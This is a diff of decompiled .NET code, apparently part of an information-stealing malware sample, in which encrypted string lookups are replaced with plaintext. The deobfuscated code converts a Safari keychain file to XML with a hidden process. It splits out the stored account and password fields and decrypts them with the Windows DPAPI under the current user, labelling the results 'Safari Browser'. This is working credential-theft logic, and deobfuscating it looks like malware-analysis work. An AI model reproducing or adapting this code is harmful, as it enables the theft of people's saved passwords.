@@ -171,14 +171,14 @@ internal sealed class AQS
 		object SF_ = array;
 		object instance = MD(ref SF_, o__);
 		array = (string[])SF_;
-		int num = Conversions.ToInteger(Operators.SubtractObject(NewLateBinding.LateGet(instance, null, O.I("3ufhCmF9/TPsbzyl95q0/g=="), new object[0], null, null, null), 1));
+		int num = Conversions.ToInteger(Operators.SubtractObject(NewLateBinding.LateGet(instance, null, "Length", new object[0], null, null, null), 1));
 		int num2 = num;
 		for (int i = 1; i <= num2; i = checked(i + 1))
 		{
-			jK.ECS_112 = YA(array[i], O.I("EHKYIKJ/Z88BTWhY2jYS/g=="), O.I("kP+2U67mO8E44h7J/kzSrw=="), 0);
-			jK.WE_114 = YA(array[i], O.I("EHKYIKJ/Z88BTWhY2jYS/g=="), O.I("kP+2U67mO8E44h7J/kzSrw=="), 5);
-			jK.GA_113 = KN(Convert.FromBase64String(YA(array[i], O.I("fn5rl5qhna8GGMVOTjs/QA=="), O.I("E71LzOI1e9U3fi1gOE3fbg=="), 0)));
-			jK.NP_115 = O.I("kUP8Kl3YLLilLYtKhbH0Fg==");
+			jK.ECS_112 = YA(array[i], "<string>", "</string>", 0);
+			jK.WE_114 = YA(array[i], "<string>", "</string>", 5);
+			jK.GA_113 = KN(Convert.FromBase64String(YA(array[i], "<data>", "</data>", 0)));
+			jK.NP_115 = "Safari Browser";
 			list.Add(jK);
 		}
 		return list;
@@ -186,18 +186,12 @@ internal sealed class AQS
 
 	private static string KN(byte[] SCY_262)
 	{
-		//Discarded unreachable code: IL_001f, IL_0032
-		//IL_0029: Expected O, but got I4
-		//IL_002a: Expected O, but got I4
 		byte[] array = ProtectedData.Unprotect(SCY_262, ZG_120, DataProtectionScope.CurrentUser);
 		return Encoding.UTF8.GetString(array, 4, checked(array.Length - 4));
 	}
 
 	internal static bool EE_(string VOJ_263, string FR_264, ref string UXJ_265)
 	{
-		//Discarded unreachable code: IL_00cd, IL_00e0
-		//IL_00d7: Expected O, but got I4
-		//IL_00d8: Expected O, but got I4
 		UXJ_265 = null;
 		if (!File.Exists(VOJ_263))
 		{
@@ -206,11 +200,11 @@ internal sealed class AQS
 		Process process = new Process();
 		process.StartInfo.FileName = VOJ_263;
 		ProcessStartInfo startInfo = process.StartInfo;
-		string left = Convert.ToString(O.I("cLmwHAZ99zYjm+jEpFTUwD1dwUAvpED6Ul7PaSR04Xg="));
+		string left = Convert.ToString(" -convert xml1 -s -o \"");
 		object SF_ = UXJ_265;
-		object right = MD(ref SF_, Path.GetTempPath() + O.I("858ZJ8kYcMHANAFzPuFgcQXuQbAWK+sSctOPlwsK+jM="));
+		object right = MD(ref SF_, Path.GetTempPath() + "\\fixed_keychain.xml\"");
 		UXJ_265 = Conversions.ToString(SF_);
-		startInfo.Arguments = Convert.ToString(Operators.AddObject(Operators.ConcatenateObject(left, right), O.I("J4TYpBNSFoaeSq6MjuzO4g=="))) + FR_264 + O.I("J4TYpBNSFoaeSq6MjuzO4g==");
+		startInfo.Arguments = Convert.ToString(Operators.AddObject(Operators.ConcatenateObject(left, right), "\"")) + FR_264 + "\"";
 		process.StartInfo.CreateNoWindow = true;
 		process.StartInfo.RedirectStandardOutput = true;
 		process.StartInfo.UseShellExecute = false;
@@ -221,17 +215,12 @@ internal sealed class AQS
 
 	private static string YA(string AI_266, string DJT_267, string LL_268, int RUR_269)
 	{
-		//Discarded unreachable code: IL_0016, IL_0029
-		//IL_0020: Expected O, but got I4
-		//IL_0021: Expected O, but got I4
 		string input = Regex.Split(AI_266, DJT_267)[checked(RUR_269 + 1)];
 		return Regex.Split(input, LL_268)[0];
 	}
 
 	private static object MD(ref object SF_270, object O__271)
 	{
-		//Discarded unreachable code: IL_000a, IL_001d
-		//IL_0014: Expected O, but got I4
 		SF_270 = RuntimeHelpers.GetObjectValue(O__271);
 		return O__271;
 	}
